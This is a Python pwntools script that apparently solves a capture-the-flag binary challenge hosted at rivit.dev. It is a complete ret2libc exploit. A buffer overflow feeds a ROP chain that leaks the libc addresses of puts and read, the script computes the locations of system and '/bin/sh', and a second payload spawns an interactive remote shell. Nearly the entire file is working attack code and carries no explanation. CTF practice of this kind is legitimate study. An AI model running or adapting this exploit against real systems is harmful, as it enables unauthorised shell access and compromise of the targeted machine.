from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('rivit.dev', 10008)
    else:
        r = process('./task')
    
    pop_rdi = 0x4012c3
    f_elf = ELF('./task')
    
    # print(hex(f_elf.got['puts']))
    # print(hex(f_elf.plt['puts']))
    # print(hex(f_elf.got['read']))
    # print(hex(f_elf.plt['read']))

    payload = b'A'*24
    payload += p64(pop_rdi)                     # call gadget
    payload += p64(f_elf.got['puts'])           # move the GOT address to rdi register
    payload += p64(f_elf.plt['puts'])           # call puts() to leak GOT address of puts()

    payload += p64(pop_rdi)                     # call gadget
    payload += p64(f_elf.got['read'])           # move the GOT address to rdi register
    payload += p64(f_elf.plt['puts'])           # call puts() to leak GOT address of puts()

    payload += p64(f_elf.symbols['main'])       # exploit again

    
    r.sendlineafter('What is your favorite color? ', payload)
    r.recvuntil("I don't like this color")
    puts_leak = u64(r.recv(8).strip().ljust(8,b'\x00'))
    read_leak = u64(r.recv(8).strip().ljust(8,b'\x00'))
    log.success(f'Success!!! Leaking the address of puts() in libc: {hex(puts_leak)}')
    log.success(f'Success!!! Leaking the address of read() in libc: {hex(read_leak)}')
    
    system_addr = puts_leak - 0x32190
    binsh_addr = puts_leak + 0x13000a
    ret = 0x40101a

    log.info(f"Address of system(): {hex(system_addr)}")
    log.info(f"Address of /bin/sh string: {hex(binsh_addr)}")

    payload = b'A'*24
    payload += p64(ret)             # Align the stack by popping 8 bytes on the top of the stack
    payload += p64(pop_rdi)         # call gadget
    payload += p64(binsh_addr)      # move string "/bin/sh" to rdi register
    payload += p64(system_addr)     # call system()

    r.recvuntil('What is your favorite color? ')
    r.sendline(payload)
    r.recvuntil("I don't like this color")

    r.interactive()
    r.close()



exploit(True)